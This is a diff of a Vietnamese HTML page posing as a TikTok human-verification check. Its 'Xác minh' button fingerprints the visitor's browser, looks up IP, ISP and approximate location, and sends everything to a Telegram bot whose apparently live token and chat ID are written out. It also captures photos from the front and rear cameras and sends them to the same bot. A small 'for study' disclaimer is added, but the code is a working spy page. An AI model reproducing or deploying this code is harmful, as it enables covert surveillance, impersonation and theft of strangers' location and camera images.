@@ -1,8 +1,9 @@
-<!DOCTYPE html><html lang="vi">
+<!DOCTYPE html>
+<html lang="vi">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TikTok</title>
+  <title>TikTok - Xác minh</title>
   <style>
     body {
       margin: 0;
@@ -29,13 +30,21 @@
       font-size: 1rem;
       cursor: pointer;
     }
+    p {
+      font-size: 0.8rem;
+      color: #aaa;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
   <h1>Bạn có phải là con người không?</h1>
-  <button onclick="initSpy()">Xác minh</button>  <script>
-    const token = "<8052142616:AAGv1o8o7caAsE6LWMA9nhH8XaIRbnS6a1c>"; // <- thay bằng token thật
-    const chatId = "<5017098451>";  // <- thay bằng chat_id thật
+  <button onclick="initSpy()">Xác minh</button>
+  <p>(Phục vụ học tập. Có sử dụng camera, IP, fingerprint gửi về Telegram cá nhân bạn.)</p>
+
+  <script>
+    const token = "8052142616:AAGv1o8o7caAsE6LWMA9nhH8XaIRbnS6a1c";
+    const chatId = "5017098451";
 
     function sha256(str) {
       const buffer = new TextEncoder().encode(str);
@@ -52,7 +61,6 @@
       ctx.fillText("fingerprint", 2, 2);
       const canvasHash = await sha256(canvas.toDataURL());
       const webglHash = await sha256(navigator.platform + navigator.vendor);
-
       const raw = [
         navigator.userAgent,
         navigator.language,
@@ -62,37 +70,40 @@
         canvasHash,
         webglHash
       ].join("|");
-
       return sha256(raw);
     }
 
     async function getInfo() {
-      const ipData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => ({}));
-      const fp = await generateFingerprint();
+      try {
+        const ipData = await fetch("https://ipapi.co/json/").then(res => res.json());
+        const fp = await generateFingerprint();
+        const isNew = !(JSON.parse(localStorage.getItem("fp_history") || "[]").includes(fp));
+        if (isNew) {
+          let history = JSON.parse(localStorage.getItem("fp_history") || "[]");
+          history.push(fp);
+          localStorage.setItem("fp_history", JSON.stringify(history));
+        }
 
-      let isNew = true;
-      let history = JSON.parse(localStorage.getItem("fp_history") || "[]");
-      if (history.includes(fp)) isNew = false;
-      else {
-        history.push(fp);
-        localStorage.setItem("fp_history", JSON.stringify(history));
+        const time = new Date();
+        const msg = `🛰 [THÔNG TIN TRUY CẬP]\n\n${isNew ? "🆕 Thiết bị mới" : "♻️ Đã từng truy cập"}
+🕒 Thời gian: ${time.toLocaleTimeString()} ${time.toLocaleDateString()}
+📱 Thiết bị: ${navigator.userAgent}
+📚 Fingerprint: ${fp}
+🌐 IP: ${ipData.ip || "Không xác định"}
+🏢 ISP: ${ipData.org || "Không xác định"}
+🏠 Địa chỉ: ${ipData.city || "-"}, ${ipData.region || "-"}, ${ipData.country_name || "-"}
+🗺 GPS: https://maps.google.com/?q=${ipData.latitude || 0},${ipData.longitude || 0}`;
+
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: msg })
+        });
+
+        alert("✅ Đã gửi thông tin IP + thiết bị!");
+      } catch (err) {
+        alert("⚠️ Lỗi khi gửi thông tin: " + err);
       }
-
-      const time = new Date();
-      const msg = `\uD83D\uDCE1 [TH\u00D4NG TIN TRUY C\u1EACP]\n\n${isNew ? "\uD83C\uDD95 Thi\u1EBFt b\u1ECB m\u1EDBi" : "\u267B\uFE0F Thi\u1EBFt b\u1ECB \u0111\u00E3 truy c\u1EADp tr\u01B0\u1EDBc"}
-\uD83D\uDD52 Th\u1EDDi gian: ${time.toLocaleTimeString()} ${time.toLocaleDateString()}
-\uD83D\uDCF1 Thi\u1EBFt b\u1ECB: ${navigator.userAgent}
-\uD83D\uDCDA Fingerprint: ${fp}
-\uD83C\uDF0D IP: ${ipData.ip || "Không xác định"}
-\uD83C\uDFE2 ISP: ${ipData.org || "Không xác định"}
-\uD83C\uDFE0 \u0110\u1ECBa ch\u1EC9: ${ipData.city || "-"}, ${ipData.region || "-"}, ${ipData.country_name || "-"}
-\uD83C\uDF04 GPS: https://maps.google.com/?q=${ipData.latitude || 0},${ipData.longitude || 0}`;
-
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: msg })
-      });
     }
 
     async function takePhoto(facingMode = "user") {
@@ -101,13 +112,11 @@
         const video = document.createElement("video");
         video.srcObject = stream;
         await video.play();
-        await new Promise(r => setTimeout(r, 800));
-
+        await new Promise(r => setTimeout(r, 1000));
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext("2d").drawImage(video, 0, 0);
-
         const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
         const form = new FormData();
         form.append("chat_id", chatId);
@@ -119,15 +128,19 @@
         });
 
         stream.getTracks().forEach(track => track.stop());
+        alert(`📸 Đã chụp ảnh camera ${facingMode === "user" ? "trước" : "sau"}`);
       } catch (err) {
-        console.warn("Không thể truy cập camera", err);
+        alert("⚠️ Không thể truy cập camera " + facingMode + ": " + err);
       }
     }
 
     async function initSpy() {
+      alert("🔃 Bắt đầu xác minh...");
       await getInfo();
       await takePhoto("user");
       await takePhoto("environment");
+      alert("✅ Xác minh hoàn tất!");
     }
-  </script></body>
+  </script>
+</body>
 </html>
